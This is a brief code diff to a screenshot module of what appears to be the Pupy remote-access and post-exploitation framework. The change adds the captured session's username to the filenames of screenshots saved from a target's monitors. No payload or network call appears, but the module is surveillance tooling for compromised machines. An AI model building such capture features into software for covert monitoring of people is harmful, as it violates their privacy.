@@ -93,7 +93,7 @@ class Screenshoter(PupyModule):
                             self.success('number of monitor detected: %s' % str(len(screenshots)))
 
                             for i, screenshot in enumerate(screenshots):
-                                filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'-'+str(i)+".png")
+                                filepath = path.join(folder, str(datetime.datetime.now()).replace(" ","_").replace(":","-")+'_'+data[pid]['username'].replace('\\','@').replace('/','@')+'-'+str(i)+".png")
                                 with open(filepath, 'w') as out:
                                     out.write(screenshot)
                                     self.success(filepath)
